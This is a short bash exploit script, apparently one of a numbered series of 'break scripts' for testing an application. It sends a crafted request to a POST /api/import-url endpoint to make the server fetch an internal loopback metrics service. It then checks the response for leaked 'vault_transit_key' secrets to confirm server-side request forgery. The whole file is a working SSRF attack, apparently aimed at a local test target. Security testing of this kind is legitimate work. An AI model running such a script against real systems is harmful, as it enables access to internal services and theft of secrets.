#!/usr/bin/env bash
set -e

# ==============================================================================
# Break Script 06: Server-Side Request Forgery (SSRF) to Internal Metrics
# ==============================================================================
# Target: POST /api/import-url
# Objective: Force the server to fetch internal loopback service:
#            http://127.0.0.1:3000/api/internal/metrics
# ==============================================================================

BASE_URL="${BASE_URL:-http://localhost:3000}"
INTERNAL_TARGET="http://127.0.0.1:3000/api/internal/metrics"

echo "[*] Triggering SSRF via POST /api/import-url targeting ${INTERNAL_TARGET}..."

RES=$(curl -s -X POST "${BASE_URL}/api/import-url" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"${INTERNAL_TARGET}\"}")

echo ""
echo "[+] SSRF Response Received from Server:"
echo "${RES}" | node -e '
  const fs = require("fs");
  const input = fs.readFileSync(0, "utf-8");
  try {
    const json = JSON.parse(input);
    console.log(JSON.stringify(json, null, 2));
    if (json.content && json.content.includes("vault_transit_key")) {
      console.log("\n[!] VULNERABILITY CONFIRMED: Server fetched internal RFC 1918 / loopback service and leaked internal vault keys!");
    }
  } catch {
    console.log(input);
  }
'
